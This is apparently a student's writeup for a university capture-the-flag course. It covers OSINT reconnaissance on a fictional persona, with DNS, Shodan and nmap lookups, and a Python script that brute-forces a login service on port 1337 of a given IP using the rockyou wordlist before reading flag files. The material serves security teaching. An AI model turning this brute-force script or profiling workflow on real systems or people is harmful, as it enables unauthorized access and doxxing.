# Writeup 2 - OSINT

Name: Tuan Le
Section: 0201

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examniation.

Digital acknowledgement: Tuan Le

## Assignment Writeup

### Part 1 (45 pts)

1. v0idcache's real name is Elizabeth Moffet

2. Elizabeth is the banking CEO at 13/37th National Bank and the URL is 
1337bank.money, the ip is 142.93.136.81

3. Twitter @v0idcache - I used Intel Techniques to find Usersherlock. I then 
used Usersherlock to search for the username and found the Twitter account.
Reddit u/v0idcache - I just googled v0idcache

4. I used dnsdumpster to obtain 5 ips and used Shodan to find information for each
216.87.155.33 - United States, VeriSign Infrastructure & Operations
216.87.152.33 - United States, VeriSing Infrastrcuture & Operations
142.93.136.81 - New York, United States, Digital Ocean
162.255.118.61 - Los Angeles, United States, Namecheap
162.255.118.62 - Los Angeles, United States, Namecheap

5. The 2 distinct flags

CMSC389R-{h1dd3n_1n_plain_5ight} - Found by looking at page source

CMSC389R-{e@5y_p3@5y-s0urc3_l3ak} - Found by looking at page source and further
examining the source of authenticate, control searched for "password" and found
username and password.

6. I performed nmap -p 1-1000 and nmap -p 1000-2000 to get the following ports
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
1337/tcp  open   waste

7. Based on the port scanner on pentest-tools.com, the operating system is
Ubuntu Linux

8. I found 3 other flags

CMSC389R-{h1ding_fil3s_in_r0bots_L0L} - Found by running 1337bank.money/robots.txt
then I found "Disallow: / secret_directory. I then ran 1337bank.money/secret_directory

CMSC389R-{h0w_2_iNt0_DNS_r3c0Rd5} - Found by using dnsdumpster with 1337bank.money

CMSC389R-{0M3G4LUL_G3T_pWN3d_N00b} - Found by just googling v0idcache and finding a
reddit post 

### Part 2 (75 pts)

I used the python stub code provided and added to it. I had to implement python
socket I/O such as reading and printing.

My code:

// Tuan Le
// UID: 115260047
// CMSC 389R (0201)

import socket

// IP address
host = "142.93.136.81"

// Open port to connect to
port = 1337 

// Wordlist file: "/usr/share/wordlists/rockyou.txt"
wordlist = open("/usr/share/wordlists/rockyou.txt", "r")

def brute_force():
    
    // Sockets: https://docs.python.org/2/library/socket.html

    username = "v0idcache"   # Hint: use OSINT

    // Iterate through each password in the wordlist and reapeatedly attempt to
    // log into v0idcache's server
    for password in wordlist:

        // Establish socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        // Reading username prompt and sending username
        data = s.recv(1024)      # Receives 1024 bytes from IP/Port
        s.send("v0idcache\n")
        print(data + username)

        // Reading password prompt and sending password
        data = s.recv(1024)      # Receives 1024 bytes from IP/Port
        s.send(password)
        print(data + password)

    s.close()

if __name__ == '__main__':
    brute_force()

I found 2 flags

CMSC389R-{brut3_f0rce_m4ster} - Found the username to be v0idcache and the password
linkinpark. Once I gained access, I cd into home and cat flag.txt

CMSC389R-{YWX4H3d3Bz6dx9lG32Odv0JZh} - Once I had access, I cd into home then cd
files then I cat a file called AB4300.txt which I found within a chat between 
v0idcache and fl1inch on pastebin.
